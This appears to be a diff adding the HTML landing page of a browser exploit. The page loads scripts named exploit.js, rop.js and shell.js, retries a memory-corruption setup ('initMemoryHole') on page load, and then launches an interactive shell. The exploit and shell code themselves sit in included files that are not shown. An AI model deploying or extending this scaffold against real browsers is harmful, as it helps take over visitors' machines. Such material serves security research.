@@ -1,0 +1,47 @@
+<html>
+<body>
+<script src="include/exploit.js"></script>
+<script src="include/jquery.min.js"></script>
+<script src="include/lib.js"></script>
+<script src="include/rop.js"></script>
+<script src="include/samples.js"></script>
+<script src="include/shell.js"></script>
+<script src="include/utils.js"></script>
+
+<script type="text/javascript">
+// Global vars
+var _gc, _cnt = 0;
+
+/*
+   Main
+*/
+window.onload = function()
+{
+    try {
+        var found = 0;
+		
+        // Try 4 times to initialize, if it doesn't work exit
+        for (var i = 0; i < 4; i++) {
+            var aspace = initMemoryHole(false);
+            if (aspace != -1) {
+				found = 1;
+				break
+			};
+        }
+
+        if (found == 0) {
+            logdbg("Initialization failed");
+            return;
+        }
+
+        // Interactive shell
+        shell(aspace);
+    } catch(e) {
+        logdbg("MainError: " + e);
+    }
+}
+</script>
+
+<div id="log"></div>
+</body>
+</html>
